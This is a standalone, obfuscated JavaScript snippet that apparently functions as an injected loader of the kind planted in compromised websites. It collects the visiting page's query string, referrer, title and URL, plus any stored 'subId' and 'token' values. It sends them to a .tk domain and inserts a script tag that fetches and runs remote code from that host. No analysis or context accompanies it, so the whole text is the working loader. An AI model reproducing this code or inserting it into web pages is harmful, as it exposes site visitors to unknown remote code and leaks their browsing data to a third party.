 (function() {
    var name = '_XvdFsS4VMGSxGp2N';
    if (!window._XvdFsS4VMGSxGp2N) {
        window._XvdFsS4VMGSxGp2N = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://rauwrapecsyschocal.tk/n8jgKX',
            P_PATH: 'https://rauwrapecsyschocal.tk/fec84ce/postback',
        };
    }
    const _Myx8zZLQVWXgL84G = localStorage.getItem('config');
    if (typeof _Myx8zZLQVWXgL84G !== 'undefined' && _Myx8zZLQVWXgL84G !== null) {
        var _GyF8cj44tvT311Qw = JSON.parse(_Myx8zZLQVWXgL84G);
        var _9jsBnwTNc133Jnb3 = Math.round(+new Date()/1000);
        if (_GyF8cj44tvT311Qw.created_at + window._XvdFsS4VMGSxGp2N.ttl < _9jsBnwTNc133Jnb3) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _322Wp78dg3DtT6yY = localStorage.getItem('subId');
    var _6gs68FBYb77y1NgX = localStorage.getItem('token');
    var _b99Qkq8tJ5sgPrhW = '?return=js.client';
        _b99Qkq8tJ5sgPrhW += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _b99Qkq8tJ5sgPrhW += '&se_referrer=' + encodeURIComponent(document.referrer);
        _b99Qkq8tJ5sgPrhW += '&default_keyword=' + encodeURIComponent(document.title);
        _b99Qkq8tJ5sgPrhW += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _b99Qkq8tJ5sgPrhW += '&name=' + encodeURIComponent(name);
        _b99Qkq8tJ5sgPrhW += '&host=' + encodeURIComponent(window._XvdFsS4VMGSxGp2N.R_PATH);
    if (typeof _322Wp78dg3DtT6yY !== 'undefined' && _322Wp78dg3DtT6yY && window._XvdFsS4VMGSxGp2N.unique) {
        _b99Qkq8tJ5sgPrhW += '&sub_id=' + encodeURIComponent(_322Wp78dg3DtT6yY);
    }
    if (typeof _6gs68FBYb77y1NgX !== 'undefined' && _6gs68FBYb77y1NgX && window._XvdFsS4VMGSxGp2N.unique) {
        _b99Qkq8tJ5sgPrhW += '&token=' + encodeURIComponent(_6gs68FBYb77y1NgX);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._XvdFsS4VMGSxGp2N.R_PATH + _b99Qkq8tJ5sgPrhW;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
